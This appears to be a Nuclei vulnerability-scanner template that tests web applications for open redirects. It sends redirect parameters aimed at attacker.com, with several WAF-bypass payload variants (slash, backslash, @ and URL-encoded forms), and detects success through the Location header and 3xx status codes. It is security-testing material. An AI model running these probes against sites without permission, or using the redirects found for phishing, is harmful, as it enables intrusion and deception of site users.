id: ultimate-open-redirect

info:
  name: Professional Open Redirect WAF Bypass
  author: thenawabx
  severity: medium

http:
  - method: GET
    path:
      # 1. Basic Redirect to Attacker Site
      - "{{BaseURL}}/?url=http://attacker.com"
      - "{{BaseURL}}/?next=https://attacker.com"
      
      # 2. Slash & Backslash Bypass
      - "{{BaseURL}}/?redirect=//attacker.com"
      - "{{BaseURL}}/?dest=/\attacker.com"
      - "{{BaseURL}}/?u=///attacker.com"
      
      # 3. Payload with @ symbol for host confusion
      - "{{BaseURL}}/?url=https://google.com@attacker.com"
      
      # 4. Encoded Slash Bypass
      - "{{BaseURL}}/?path=%2f%2fattacker.com"
      - "{{BaseURL}}/?redirect=%5c%5cattacker.com"
      
      # 5. Parameter Pollution / Path variation
      - "{{BaseURL}}/?api_url=https://attacker.com"
      - "{{BaseURL}}/?return_to=//attacker.com"

    matchers-condition: and
    matchers:
      # Detection through Location Header
      - type: regex
        name: open-redirect-found
        part: header
        regex:
          - "(?i)Location: (https?://|//|/\\\\)attacker\\.com"

      # Ensure it's a redirect status code
      - type: status
        status:
          - 301
          - 302
          - 307
          - 308
